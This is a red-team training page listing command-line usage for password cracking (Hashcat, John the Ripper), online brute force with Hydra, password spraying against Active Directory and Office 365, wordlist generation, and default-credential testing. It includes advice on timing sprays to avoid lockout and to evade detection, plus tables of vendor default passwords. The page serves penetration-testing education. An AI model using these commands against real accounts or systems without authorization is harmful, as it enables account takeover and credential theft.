---
layout: training-page
title: "Password & Credential Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - passwords
  - cracking
  - spraying
  - hashcat
page_key: "tools-passwords"
render_with_liquid: false
---

# Password & Credential Tools

Tools for cracking hashes, brute-forcing services, password spraying, and credential validation.
    Covers offline cracking, online spraying, and wordlist generation.

 HASHCAT 

## // Hashcat

World's fastest password recovery tool. GPU-accelerated — orders of magnitude faster than CPU-based tools. Supports 350+ hash algorithms. Essential for cracking NTLM, NTLMv2, Kerberos, bcrypt, and all other captured hashes.

### Install

```
sudo apt install hashcat
# or download binary + CUDA/OpenCL runtime
# https://hashcat.net/hashcat/
```

### Hash Mode Reference

| Mode (-m) | Hash Type | Source |
| --- | --- | --- |
| 1000 | NTLM | SAM, NTDS.dit, secretsdump |
| 5600 | NetNTLMv2 | Responder, ntlmrelayx |
| 5500 | NetNTLMv1 | Responder (legacy) |
| 13100 | Kerberoast (TGS-REP) | Rubeus, impacket GetUserSPNs |
| 18200 | AS-REP Roast | Rubeus asreproast, GetNPUsers |
| 3200 | bcrypt | Linux /etc/shadow, web apps |
| 1800 | sha512crypt | Linux /etc/shadow |
| 400 | phpass (WordPress) | WordPress, phpBB |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | hcxdumptool captures |
| 0 | MD5 | Legacy web apps |
| 100 | SHA1 | Legacy web apps |

### Common Usage

```
# Dictionary attack (most common — start here)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (best combination)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule

# Multiple wordlists
hashcat -m 1000 hashes.txt wordlist1.txt wordlist2.txt

# Combination attack (combine two wordlists)
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Brute force mask (8-char alphanumeric)
hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# Mask attack with known pattern (capital + 6 lower + digit + special)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?s

# Hybrid (wordlist + mask — e.g., word + year)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d

# Kerberoasting
hashcat -m 13100 kerberoast-hashes.txt rockyou.txt -r best64.rule

# NTLMv2 (Responder)
hashcat -m 5600 ntlmv2.txt rockyou.txt

# Show cracked passwords
hashcat -m 1000 hashes.txt --show

# GPU optimizations
hashcat -m 1000 hashes.txt rockyou.txt -O -w 4  # -O optimized, -w 4 max GPU use

# Check GPU status
hashcat -I  # GPU info
hashcat -b  # benchmark
```

### Top Rule Files

```
# Included with hashcat
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/d3ad0ne.rule
/usr/share/hashcat/rules/dive.rule
/usr/share/hashcat/rules/rockyou-30000.rule

# Community
# OneRuleToRuleThemAll.rule (github.com/NotSoSecure/password_cracking_rules)
# nsa-rules (github.com/NSAKEY/nsa-rules)
```

### Mask Charset Reference

```
?l = lowercase letters (a-z)
?u = uppercase letters (A-Z)
?d = digits (0-9)
?s = special characters (!@#$...)
?a = all printable characters (?l?u?d?s)
?b = all bytes (0x00-0xff)

# Example: "Password1!" pattern
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?l?d?s
```

---

 JOHN THE RIPPER 

## // John the Ripper

Classic CPU-based password cracker. Excellent for automatic hash detection, complex rules, and cracking password-protected files (ZIP, RAR, PDF, SSH keys, KeePass databases). Use John for file cracking, Hashcat for bulk hash cracking.

### Install

```
sudo apt install john           # community version
# OR compile Jumbo (recommended — more formats)
git clone https://github.com/openwall/john
cd john/src && ./configure && make -s clean && make -sj4
```

### Common Usage

```
# Auto-detect hash type and crack
john hashes.txt --wordlist=rockyou.txt

# Specific format
john hashes.txt --format=NT --wordlist=rockyou.txt
john hashes.txt --format=sha512crypt --wordlist=rockyou.txt

# List supported formats
john --list=formats

# Rules
john hashes.txt --wordlist=rockyou.txt --rules=best64

# Crack SSH private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt

# Crack zip file
zip2john protected.zip > zip.hash
john zip.hash --wordlist=rockyou.txt

# KeePass database
keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt

# 7-zip
7z2john protected.7z > 7z.hash
john 7z.hash --wordlist=rockyou.txt

# Show cracked passwords
john --show hashes.txt

# Incremental (brute force)
john hashes.txt --incremental=Alnum
```

---

 HYDRA 

## // Hydra

Multi-protocol online brute-force tool. Supports SSH, FTP, HTTP, SMB, RDP, Telnet, LDAP, MySQL, PostgreSQL, and many more. Use for targeted brute-force when lockout policies are relaxed or disabled.

### Install

```
sudo apt install hydra
```

### Common Usage

```
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# HTTP POST login form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin

# SMB
hydra -l administrator -P rockyou.txt smb://192.168.1.10

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# FTP
hydra -l ftp -P rockyou.txt ftp://192.168.1.10

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# Multiple usernames and passwords
hydra -L users.txt -P rockyou.txt ssh://192.168.1.10

# Verbose + stop on first success
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -V -f

# Limit connections (avoid lockout)
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -t 4 -W 5  # 4 threads, 5s wait
```

### Detections

- High volume of failed authentication attempts — any SIEM/IDS catches this
- Event 4625 (Windows failed logon), /var/log/auth.log (Linux), /var/log/secure
- Account lockout policies will lock accounts after threshold
- Fail2ban: bans IPs after repeated failures (SSH, HTTP)
- Use -t 1 -W 30 for very slow spray to evade rate-based detection

---

 KERBRUTE PASSWORDS 

## // Password Spraying — Best Practices

Spraying one password across many accounts is the safest way to avoid lockout. Key tools: Kerbrute (Kerberos), NetExec (SMB/WinRM), Spray (Office365/Azure AD), MSOLSpray, TeamFiltration.

### Spray Timing Formula

```
# Determine lockout policy
nxc smb DC01 -u guest -p '' --pass-pol

# Rule: spray password count < lockout threshold
# If lockout = 5 attempts, spray max 3 attempts per account
# Wait = observation window + safety margin

# Example: threshold=5, window=30min → spray 3 passwords, wait 35min between rounds
```

### Spray Tools by Protocol

```
# Kerberos (preferred — no Event 4625 on failed guesses)
kerbrute passwordspray --dc DC01.domain.local -d domain.local users.txt 'Winter2025!'

# SMB/WinRM via NetExec
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2025!' --continue-on-success
nxc winrm 192.168.1.0/24 -u users.txt -p 'Winter2025!'

# LDAP
nxc ldap DC01 -u users.txt -p 'Winter2025!'

# Azure AD / Office 365
# MSOLSpray
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password 'Winter2025!'

# TeamFiltration (Teams-based user enum + spray)
./TeamFiltration --outpath /tmp/team --spray --password 'Winter2025!'

# Password policy check before spraying
nxc smb DC01 -u '' -p '' --pass-pol                    # null session
nxc ldap DC01 -u user -p 'Pass123' --password-not-required  # find no-preauth accounts
```

### Wordlist Generation

```
# CeWL: generate wordlist from target website
cewl https://example.com -m 5 -w custom-words.txt --with-numbers

# Mentalist: rule-based wordlist generation (GUI tool)
# Common corporate password patterns:
# Season+Year+Special: Spring2025!, Summer2025@
# Company+Year+Special: Acme2025!, CorpPass1!
# Name+Birth patterns

# CUPP: Common User Passwords Profiler
cupp -i  # interactive mode — generate personal wordlist

# Username + password combos
while IFS= read -r user; do echo "{$user}:$(echo $user | sed 's/.*/\u&/')123"; done < users.txt
```

---

 CRACKMAPEXEC / NETEXEC PASSWORD 

## // Default Credential Testing

Testing default credentials on services before attempting brute force. Many devices and applications ship with unchanged default credentials, making this a high-value, low-noise technique.

### Tools & Resources

```
# Default Credentials DB
# https://github.com/ihebski/DefaultCreds-cheat-sheet

# Nuclei default credentials templates
nuclei -u https://target -t default-logins/

# Medusa (multi-protocol like Hydra)
medusa -h 192.168.1.10 -u admin -p admin -M http -m DIR:/admin

# nxc with common defaults
nxc smb 192.168.1.0/24 -u administrator -p '' --local-auth  # blank password
nxc smb 192.168.1.0/24 -u administrator -p administrator --local-auth

# Common defaults to try
# admin:admin, admin:password, admin:1234, admin:123456
# root:root, root:toor, root:password
# administrator:(blank), guest:(blank)
# For specific device classes: use vendor documentation
```

### High-Value Default Credential Targets

| Device/Service | Common Defaults | Port |
| --- | --- | --- |
| Cisco IOS | cisco:cisco, admin:cisco | 22, 23 |
| Juniper | root:(blank) | 22 |
| Tomcat | admin:admin, tomcat:tomcat | 8080 |
| Jenkins | admin:admin (initial setup) | 8080 |
| Elastic | elastic:elastic (or no auth) | 9200 |
| Redis | (no auth by default) | 6379 |
| MongoDB | (no auth by default) | 27017 |
| Kubernetes API | (anon auth enabled by default pre-1.14) | 6443 |
| IPMI/BMC | ADMIN:ADMIN, admin:admin | 623 |
